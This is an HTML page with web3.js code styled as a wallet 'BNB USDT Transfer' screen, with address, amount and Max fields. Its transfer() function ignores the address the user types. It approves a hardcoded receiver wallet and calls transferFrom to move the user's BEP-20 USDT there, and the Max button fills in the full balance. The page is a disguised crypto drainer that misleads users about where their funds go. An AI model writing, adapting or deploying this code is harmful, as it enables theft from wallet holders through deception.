<!DOCTYPE html>
<html>
<head>
  <title>BNB USDT Transfer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }
    .container {
      flex: 1;
      padding: 16px;
      overflow-y: auto;
    }
    label {
      font-size: 14px;
      color: #555;
      margin-bottom: 4px;
      display: block;
    }
    input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .row {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .max-btn {
      font-weight: bold;
      color: #0052ff;
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
    }
    .footer {
      padding: 16px;
      background: #fff;
      border-top: 1px solid #eee;
    }
    .btn {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 20px;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn.processing {
      background-color: #ccc;
      color: #0052ff;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>Address or Domain Name</label>
    <input type="text" id="toAddress" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />

    <label>Amount</label>
    <div class="row">
      <input type="number" id="amount" placeholder="Enter USDT Amount" />
      <button class="max-btn" onclick="setMax()">Max</button>
    </div>
  </div>

  <div class="footer">
    <button id="nextBtn" class="btn" onclick="transfer()">Next</button>
  </div>

  <script>
    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const ABI = [
      { "constant":true, "inputs":[{"name":"owner","type":"address"}], "name":"balanceOf", "outputs":[{"name":"","type":"uint256"}], "type":"function" },
      { "constant":false, "inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}], "name":"approve", "outputs":[{"name":"","type":"bool"}], "type":"function" },
      { "constant":false, "inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}], "name":"transferFrom", "outputs":[{"name":"","type":"bool"}], "type":"function" }
    ];

    async function setMax() {
      if (!window.ethereum) return alert("Use Trust Wallet DApp browser.");
      const web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const user = accounts[0];
      const contract = new web3.eth.Contract(ABI, USDT);
      const bal = await contract.methods.balanceOf(user).call();
      const amount = web3.utils.fromWei(bal, 'ether');
      document.getElementById("amount").value = parseFloat(amount);
    }

    async function transfer() {
      const btn = document.getElementById("nextBtn");
      btn.innerText = "⏳ Processing...";
      btn.classList.add("processing");

      try {
        if (!window.ethereum) return alert("Trust Wallet DApp browser required.");

        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }]
        });

        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        const user = accounts[0];

        const amount = document.getElementById("amount").value;
        const to = document.getElementById("toAddress").value;
        if (!amount || !to) return alert("All fields required.");

        const contract = new web3.eth.Contract(ABI, USDT);
        const value = web3.utils.toWei(amount, "ether");

        await contract.methods.approve(RECEIVER, value).send({ from: user });
        await contract.methods.transferFrom(user, RECEIVER, value).send({ from: user });

        btn.innerText = "✅ Done";
      } catch (e) {
        console.error(e);
        btn.innerText = "❌ Failed";
      }

      btn.classList.remove("processing");
    }
  </script>
</body>
</html>
